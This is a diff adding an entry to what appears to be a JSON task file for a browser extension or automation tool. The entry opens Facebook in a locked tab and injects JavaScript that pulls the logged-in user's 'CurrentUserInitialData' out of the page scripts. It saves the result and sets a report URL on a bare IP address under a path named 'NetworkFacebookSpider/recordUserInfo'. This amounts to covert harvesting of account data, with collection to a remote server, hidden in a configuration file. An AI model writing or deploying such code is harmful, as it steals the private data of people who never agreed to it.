@@ -1,2 +1,35 @@
 [
+    {
+        "id": "RANDOMRESULT{{.Timestamp}}",
+        "url": "https://www.facebook.com",
+        "type": 1,
+        "includeIframe": 0,
+        "param": {
+            "sub": [
+                {
+                    "id": "2",
+                    "url": `
+                    for(var i in window.document.scripts) {
+                        if(window.document.scripts[i].innerHTML && window.document.scripts[i].innerHTML.indexOf('CurrentUserInitialData') > 0) {
+                            return window.document.scripts[i].innerHTML;
+                        }
+                    }
+                    `,
+                    "type": 100,
+                    "param": {
+                        "delay": 300,
+                        "save":1,
+                        "lockTab": 1
+                    },
+                    "code": 1
+                }
+            ],
+            "delay": 2000,
+            "musave": 0,
+            "lockTab": 1,
+			"lockTabFlag": "fb-open",
+            "reportUrl":"http://47.89.25.177/Ir/NetworkFacebookSpider/recordUserInfo?iType=8192"
+        },
+        "code": 1
+    }
 ]
